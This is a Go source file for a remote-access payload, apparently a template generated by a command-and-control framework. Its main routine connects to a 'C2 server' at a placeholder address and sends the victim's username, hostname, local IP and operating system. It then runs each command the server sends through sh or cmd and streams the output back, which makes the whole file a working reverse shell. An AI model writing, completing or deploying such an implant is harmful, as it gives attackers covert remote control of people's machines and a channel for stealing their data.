package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
)

func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "N/A"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func sendMetadata(conn net.Conn) {
	// Get system info
	u, _ := user.Current()
	hostname, _ := os.Hostname()
	ip := GetOutboundIP()

	// Ensure username and hostname have default values if empty
	username := u.Username
	if username == "" {
		username = "unknown"
	}
	
	if hostname == "" {
		hostname = "unknown"
	}

	// Old verbose format (keeping it for compatibility)
	msg := "[+] Golang payload:\n" +
		"\t- Username: " + username + "\n" +
		"\t- Hostname: " + hostname + "\n" +
		"\t- LocalIP: " + ip + "\n" +
		"\t- OS: " + runtime.GOOS + "\n"

	conn.Write([]byte(msg + "\n"))
}

func executeCommand(command string) string {
	// Special handling for metadata request
	if command == "METADATA" {
		u, _ := user.Current()
		hostname, _ := os.Hostname()
		
		// Ensure username and hostname have default values if empty
		username := u.Username
		if username == "" {
			username = "unknown"
		}
		
		if hostname == "" {
			hostname = "unknown"
		}
		
		return username + "|" + hostname + "|" + runtime.GOOS + "|Golang"
	}

	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "[Error] " + err.Error() + "\n" + string(output)
	}
	return string(output)
}

func handleCommands(conn net.Conn) {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()
		
		// Skip empty commands
		if strings.TrimSpace(command) == "" {
			continue
		}
		
		// Special case for metadata
		if command == "METADATA" {
			u, _ := user.Current()
			hostname, _ := os.Hostname()
			
			// Ensure username and hostname have default values if empty
			username := u.Username
			if username == "" {
				username = "unknown"
			}
			
			if hostname == "" {
				hostname = "unknown"
			}
			
			conn.Write([]byte(username + "|" + hostname + "|" + runtime.GOOS + "|Golang\n"))
			continue
		}
		
		// Execute command and get result
		result := executeCommand(command)
		
		// Make sure we have something to return
		if strings.TrimSpace(result) == "" {
			conn.Write([]byte("Command executed with no output\n"))
			continue
		}
		
		// Send each line of the output
		lines := strings.Split(result, "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) != "" {
				_, err := conn.Write([]byte(line + "\n"))
				if err != nil {
					fmt.Println("Error sending output:", err)
					return
				}
			}
		}
		
		// Send a terminator so the server knows we're done
		conn.Write([]byte("--END--\n"))
	}
	
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading input:", err)
	}
}

func main() {
	// Connect to the C2 server
	conn, err := net.Dial("tcp", "{{TARGET_IP}}:{{TARGET_PORT}}")
	if err != nil {
		log.Fatal("Connexion échouée :", err)
	}
	defer conn.Close()

	// Send initial metadata
	sendMetadata(conn)
	
	// Handle commands
	handleCommands(conn)
}
